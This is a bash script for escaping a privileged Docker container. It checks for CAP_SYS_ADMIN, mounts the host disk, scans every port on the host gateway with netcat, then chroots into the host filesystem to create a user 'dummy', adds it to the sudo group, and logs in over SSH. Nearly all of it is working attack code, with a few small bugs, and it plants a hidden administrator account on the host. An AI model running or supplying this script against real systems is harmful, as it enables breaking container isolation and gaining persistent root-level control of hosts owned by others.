RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'

echo -e "${GREEN}[*] Installing the following packages"
echo -e "${GREEN}    + libcap2/libcap2-bin (for the capsh tool)"
echo -e "${GREEN}    + fidsk (for the fdisk utility)"
echo -e "${GREEN}    + build-essential (for missing default tools)"
echo -e "${GREEN}    + findmnt (to find all mounts points and apply filters)"
echo -e "${GREEN}    + jq (to handle JSON output)"
echo -e "${GREEN}    + netcat (for open ports)"
echo -e "${GREEN}    + openssh-server (for SSH server)"
echo -e "${GREEN}    + net-tools (for get network configurations)"

apt update && apt install -y netcat \
			     net-tools \
			     openssh-server \
			     libcap2

stty erase ^H

echo -e "${GREEN}[*] Installing Finished"
echo -e "${GREEN}[*] Check for the CAP_SYS_ADMIN capability available"
cap=$(capsh --print | grep -E '[^!]cap_sys_admin') # Check if CAP_SYS_ADMIN capability is activated
if [[ ! -z ${cap} ]]; then
	echo -e "${GREEN}[*] CAP_SYS_ADMIN capability found"
else
	echo -e "${RED}[*] CAP_SYS_ADMIN capability not found. Impossibility to continue."
	echo -e "${RED}[*] Exiting ..."
	exit 1
fi;

echo -e "${GREEN}[*] Check if there is a device that mount the host filesystem"
fdisk -l  # Check if there is a device that mount the host filesystem

read -p "Type the device: " dev

echo -e "${GREEN}[*] Check if the host filesystem " ${dev} " is already mounted"
ismounted=$(findmnt --source ${dev} --json | jq '.filesystems[] | select(.source == "'${dev}'") | .target')
test ! -z ${ismounted} && echo -e "${GREEN}[*]" ${dev} " is mounted on " ${ismounted} || echo -e "${YELLOW}[*]" ${dev} " is not mounted"

dest="/tmp"
read -p "Type a destination: (default /tmp) " dest

if [[ -z ${ismounted} ]]; then
	echo -e "${GREEN}[*] Check if " ${dest} " already exists"
	# Check if the directory exists or not
	if [[ -d ${dest} ]]; then
		echo -e "${GREEN}[*] " ${dest} " created"
		mkdir -p ${dest}
	fi;

	echo "[*] Mouting " ${dev} " to " ${dest}
	mount ${dev} ${dest}  # Mount the device on the destination
fi;

echo -e "${GREEN}[*] Get IP addresses"
ifconfig  # get IP address

read -p "Type the IP address of the host: (usually 172.17.0.1) " ip

echo -e "${GREEN}[*] Check for open ports to an SSH server"
nc -vn -w2 -z ${ip} 1-65535 2>&1 | grep succeeded  # Checks for opern ports

read -p "It is open? (leave blank for NO) " ans
test ! -z ${ans} && echo "[*] Start the SSH server" || (echo -e "${RED}[*] Can't continue. Exiting ..." && exit 1)

service ssh start  # Start the SSH service

echo -e "${GREEN}[*] Creating a new user named: dummy"
chroot ${dest} adduser dummy  # Create a new dummy user

echo -e "${GREEN}[*] Giving dummy sudo privileges"
chroot ${dest} usermod -aG sudo dummy  # Gives dummy sudo privileges

echo -e "${GREEN}[*] Remote connection with dummy"
ssh dummy@172.17.0.1

echo -e "${GREEN}[*] Terminating ... "